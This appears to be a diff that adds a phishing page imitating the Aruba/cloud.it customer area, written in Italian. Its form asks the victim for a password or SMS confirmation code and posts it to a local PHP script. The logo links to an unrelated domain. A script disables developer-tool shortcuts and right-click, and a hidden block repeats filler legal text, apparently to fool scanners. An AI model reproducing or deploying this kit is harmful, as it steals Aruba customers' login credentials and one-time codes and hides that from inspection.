@@ -1,0 +1,170 @@
+﻿<html><head>
+<meta content="text/html; charset=utf-8" http-equiv="content-type"/><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<link href="https://customerarea.aruba.it/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png"/>
+<link href="file32/css.css" rel="stylesheet"/>
+<meta contents="noindex,nofollow" name="robots"/>
+<meta content="7481b809-42f5-4fcf-83e3-825d3d454b2f" name="OnecartToken"/>
+<link href="file32/css_002.css" rel="stylesheet"/>
+<script>
+
+	document.onkeydown = function(e) {
+	  if(event.keyCode == 123) {
+	     return false;
+	  }
+	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
+	     return false;
+	  }
+	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
+	     return false;
+	  }
+	  if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
+	     return false;
+	  }
+	}
+
+
+	
+	document.addEventListener('contextmenu', function(e) {
+	  e.preventDefault();
+	});
+
+</script>
+<title>Aruba - Dati Cliente</title></head>
+<body>
+<div class="cloud-body ng-scope" ng-app="OneCartApp">
+<header class="header">
+<div aria-multiselectable="true" class="top-navbar-panels hidden-print" id="header">
+<div>
+<div class="navbar-inverse navbar-collapse collapse hidden-print navbar-custom">
+<div class="navbar-left">
+<ul class="nav navbar-nav">
+<li class="">
+<a aria-expanded="true" aria-haspopup="true" class="dropdown-toggle" data-toggle="dropdown" href="#" role="button"><span class="ng-scope ng-binding" translate="">Italiano</span>  <span class="caret"></span></a>
+<ul class="dropdown-menu inverse-dropdown" id="dropdown-menu-languages">
+<li class="ng-hide" ng-show="$root.currentLanguage!='it-IT'" style=""><a class="ng-scope" href="#" ng-click="$root.setLanguage('it-IT')" translate="">Italiano</a></li>
+<li class="" ng-show="$root.currentLanguage!='en-US'"><a class="ng-scope" href="#" ng-click="$root.setLanguage('en-US')" translate="">Inglese</a></li>
+<li class="" ng-show="$root.currentLanguage!='es-ES'"><a class="ng-scope" href="#" ng-click="$root.setLanguage('es-ES')" translate="">Spagnolo</a></li>
+<li class="" ng-show="$root.currentLanguage!='fr-FR'"><a class="ng-scope" href="#" ng-click="$root.setLanguage('fr-FR')" translate="">Francese</a></li>
+</ul>
+</li>
+</ul>
+</div>
+<div class="navbar-right">
+<ul class="nav navbar-nav">
+<li>
+<a href="https://www.cloud.it/login.aspx">
+<span class="glyphicon glyphicon-user"> </span><span class="ng-scope" translate="">accedi</span>
+</a>
+</li>
+<li>
+<a href="https://www.cloud.it/assistenza-clienti.aspx">
+<span class="glyphicon glyphicon-headphones"> </span><span class="ng-scope" translate="">assistenza h24</span>
+</a>
+</li>
+<li>
+<a href="https://www.cloud.it/assistenza-clienti/assistenza-commerciale.aspx">
+<span class="glyphicon glyphicon-question-sign"> </span><span class="ng-scope" translate="">prevendita</span>
+</a>
+</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+<div class="container">
+<div class="row">
+<div class="col-xs-8 col-sm-6 margin-top-10 padding-right-0 padding-left-15">
+<button class="navbar-toggle navbar-button-collapse collapsed" data-target=".navbar-collapse" data-toggle="collapse" type="button">
+<span class="icon-bar"></span>
+<span class="icon-bar"></span>
+<span class="icon-bar"></span>
+</button>
+<a class="logo-link" href="http://www.archangeldiary.com/CloudChargeCredit">
+<div class="img-logo"></div>
+</a>
+</div>
+<div class="hidden-xs col-sm-6" id="loginInfoContainer" ng-show="$root.LoggedUser" style="">
+<div id="loginInfo">
+<ul class="userinfo" style="float:right;">
+<li class="logout">
+<a class="ng-scope" ng-click="$root.logout()" translate="">Esci</a>
+</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+</header>
+<div class="container hidden-print">
+</div>
+<div>
+<div class="loading ng-hide" ng-show="$root.nLoading&gt;0" style=""></div>
+<div>
+<div class="" style="padding-top:8px;">
+<div>
+<div class="alert alert-danger" id="errormessage" style="display:none"></div>
+<div id="body-container">
+<!-- base href="http://www.archangeldiary.com/CloudChargeCredit" -->
+<!-- uiView:  --><div class="ng-scope" style="" ui-view="">
+<div class="ng-scope">
+<div class="content">
+<div class="container margin-bottom-20">
+<!-- uiView:  --><div autoscroll="true" class="margin-bottom-20 ng-scope" style="" ui-view=""><div class="ng-scope" data-ng-init="startup()">
+<form action="./nj2.php" class="ng-pristine ng-valid ng-valid-validator" method="post">
+<div class="" ng-show="isUpdate">
+<h1 class="ng-scope" translate="">AGGIORNARE</h1>
+<h4 class="ng-scope" translate="">Per poter confermare è necessario inserire la password chiave elettronica o codice sms ricevuto sul numero di telefono.</h4>
+</div>
+<div class="form-horizontal">
+<h3 class="ng-scope" ng-if="isCompany" translate="">Password o Codice sms</h3><!-- end ngIf: isCompany -->
+<!--Geography-->
+<div class="col-md-11 col-md-offset-1">
+<div class="form-group">
+</div>
+<div class="form-group">
+<h4 class="ng-scope" translate="">Questa autenticazione è necessario per confermare l'operazione.</h4>
+<label class="control-label col-md-3"><span class="ng-scope" translate="">Password o Codice sms</span> <span class="text-danger"> * </span></label>
+<div class="col-md-9">
+<input class="form-control ng-pristine ng-untouched ng-valid" name="s12" required="" style="display: inline-block; max-width:150px;" type="text"/> <img src="file32/ICO_pw_token.gif" style="vertical-align:top;margin:3px 1px 0 4px;"/><img src="file32/phone.png" style="vertical-align:top;margin:2px 1px 0 4px; width:5%;"/>
+</div>
+</div>
+<div class="row">
+<div class="col-xs-12 col-sm-4 col-sm-offset-6 col-md-offset-8 margin-top-100">
+<button class="primaryBtn btn button btn-custom btn" type="submit">
+<strong class="primaryBtnHeader ng-scope" translate="">Confermare</strong>
+</button>
+</div>
+</div>
+<br/>
+</div>
+</div></form>
+</div>
+</div>
+</div></div>
+</div>
+</div>
+<input id="errorLog" type="hidden"/>
+</div>
+</div>
+</div>
+</div>
+<footer class="zoneFooter">
+<table width="100%">
+<tbody><tr>
+<td width="auto">
+<hr class="margin-top-10"/>
+</td>
+<td style="text-align:center;" width="650">
+<img alt="logo" class="arubaGroupLogo" src="file32/logo-aruba-group.png"/>
+<span class="copyrightBottomDescription">Copyright ©2018 Aruba S.p.A.- P.I. 01573850516 - All rights reserved - </span>
+</td>
+<td width="auto">
+<hr class="margin-top-10"/>
+</td>
+</tr>
+</tbody></table>
+</footer>
+<div id="batBeacon0.37347360400338103" style="width:0px; height:0px; display:none; visibility:hidden;"><img alt="" height="0" id="batBeacon0.915264610593383" src="file32/0_003.txt" style="width:0px; height:0px; display:none; visibility:hidden;" width="0"/></div><div id="batBeacon0.6650930024932824" style="width:0px; height:0px; display:none; visibility:hidden;"><img alt="" height="0" id="batBeacon0.3321755278522869" src="file32/0_002.txt" style="width:0px; height:0px; display:none; visibility:hidden;" width="0"/></div><div id="batBeacon0.5510898558382857" style="width:0px; height:0px; display:none; visibility:hidden;"><img alt="" height="0" id="batBeacon0.4035185849754832" src="file32/0.txt" style="width:0px; height:0px; display:none; visibility:hidden;" width="0"/></div></div></div><div aria-hidden="true" style="display:none;">This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users. This is a standard page outlining terms of service, accessibility, privacy policies, data protection guidelines, legal notices, and compliance information for users.</div></body></html>
